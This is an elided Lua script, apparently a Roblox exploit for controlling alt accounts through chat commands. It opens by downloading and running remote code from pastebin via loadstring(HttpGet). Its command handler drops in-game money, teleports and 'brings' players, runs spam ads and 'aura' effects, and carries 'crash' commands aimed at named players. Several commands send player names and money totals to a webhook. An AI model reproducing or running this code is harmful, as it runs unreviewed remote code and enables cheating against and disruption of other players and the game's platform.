...
if game.Players.LocalPlayer.Name == getgenv().HostUser or getgenv().Executed then
	loadstring(game:HttpGet("https://pastebin.com/raw/QyZrbPwf"))()
	loadstring(game:HttpGet(" https://pastebin.com/raw/mynaN7Tb"))()
end
	...
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
		...
		local Embed = {
			...
			author = {
			  ...
			  fields = {
				{
					name = player.Name ..'  has '..game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.MoneyText.Text.." amount of money";
					value = player.Name ..'  has '..game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.MoneyText.Text.." amount of money";
				},
			};
	...
	Connections["OnChat"] = game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(data)
		...
		if Host and not Crashed and Variables["Player"].Character and Variables["Player"].Character:FindFirstChild("HumanoidRootPart") and Variables["Player"].Character:FindFirstChild("Humanoid") and Variables["Player"].Character.Humanoid.Health > 0 then
			if Args[1] == prefix.."drop" then
				Drop(true)
			elseif not CmdSettings["AdOn"] and Args[1] == prefix.."ad" and Args[2] == "on" then
				local newStr = string.gsub(Message, prefix.."ad on", "")
			...
			elseif Message == prefix.."ad off" then				
				CmdSettings["AdOn"] = nil
			elseif Message == prefix.."loopdel" then
				if DropFolder then
					DropFolder:Destroy()
					DropFolder = nil
				end
			elseif Message == prefix.."circle host" and Host and Host.Character and Host.Character:FindFirstChild("Humanoid") and Host.Character.Humanoid.Health > 0 then
				local angle = 0
			...
			elseif Args[1] == prefix.."crash" and Args[2] == "swag" and not Crashed then
			...
			elseif Args[1] == prefix.."crash" and Args[2] == "encrypt" and not Crashed then
				local Player = GetPlayerFromString(Args[3],true)
				if Player and Player == game.Players.LocalPlayer then
					if game.CoreGui:FindFirstChild("RenderScreen") then
						game.CoreGui.RenderScreen:Destroy()
			...
			elseif Args[1] == prefix.."bring" and Args[2] == "host" and BringLocations[string.lower(Args[3])] then
				BringPlr(Host,BringLocations[string.lower(Args[3])])
			elseif Args[1] == prefix.."bring" and BringLocations[string.lower(Args[3])] then
				local FoundPlayer = GetPlayerFromString(Args[2])
				if FoundPlayer then
					BringPlr(FoundPlayer,BringLocations[string.lower(Args[3])])
				end
			elseif Args[1] == prefix.."bring" and Args[3] == "host" then
				local FoundPlayer = GetPlayerFromString(Args[2])
				if FoundPlayer then
					BringPlr(FoundPlayer,nil)
				end
			elseif Message == prefix.."setup bank" then
                Setup("Bank")
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-375, 21, -360)
                if getgenv().webhook == nil then
                    return
                else
                local player = game:GetService("Players").LocalPlayer
                ...
                local Embed = {
                    ...
                    author = {
                      ...
                      fields = {
                        {
                            name = player.Name ..'  has changed the setup!';
                            value = "New location is: Bank";
                        },
                    };
                    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
                };
			...
			elseif Message == prefix.."setup admin" then
				Setup("Admin")
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-871, -32, -530)
                if getgenv().webhook == nil then
                    return
                else
                local player = game:GetService("Players").LocalPlayer
			...
			elseif Message == prefix.."setup klub" then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-264, 0, -332)
				Setup("Klub")
                if getgenv().webhook == nil then
                    return
                else
                ...
                local Embed = {
                    ...
                    author = {
                      ...
                      fields = {
                        {
                            name = player.Name ..'  has changed the Klub!';
                            value = "New location is: Bank";
                        },
                    };
                    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
			...
			elseif Message == prefix.."setup vault" then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-519, 23, -284)
				Setup("Vault")
                if getgenv().webhook == nil then
                    return
                else
			...
			elseif Message == prefix.."setup train" then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(629, 48, -85)
				Setup("Train")
                if getgenv().webhook == nil then
                    return
                else
			...
			elseif Message == prefix.."wallet" then
				ShowWallet()
			elseif Message == prefix.."dolphin" then
			...
			elseif Message == prefix.."monkey" then
				if CurrAnim and CurrAnim.IsPlaying then
					CurrAnim:Stop()
				end
				local Anim = Instance.new("Animation")
				...
				CurrAnim:Play()
				CurrAnim:AdjustSpeed()
			elseif Message == prefix.."floss" then
				if CurrAnim and CurrAnim.IsPlaying then
					CurrAnim:Stop()
				end
				local Anim = Instance.new("Animation")
				...
				CurrAnim:Play()
				CurrAnim:AdjustSpeed()
			elseif Message == prefix.."shuffle" then
				if CurrAnim and CurrAnim.IsPlaying then
					CurrAnim:Stop()
				end
				local Anim = Instance.new("Animation")
				...
				CurrAnim:Play()
				CurrAnim:AdjustSpeed()
			elseif Message == prefix.."stopdance" then
				if CurrAnim and CurrAnim.IsPlaying then
					CurrAnim:Stop()
				end
			elseif Message == prefix.."maskon" then
				...
				Root.CFrame = OldCF
			elseif Message == prefix.."maskoff" then
				local plr = game.Players.LocalPlayer
				local c = plr.Character
				local Root = c.PrimaryPart
			...
			elseif Args[1] == prefix.."money" then
				Money()
			elseif Args[1] == prefix.."CountMoney" then
				Money()
			elseif Args[1] == prefix.."aura" then
			...
			elseif Args[1] == prefix.."stopaura" then
				CmdSettings["Aura"] = nil
			elseif Args[1] == prefix.."cdrop" and Args[2] ~= nil and not CmdSettings["CustomDrop"] then
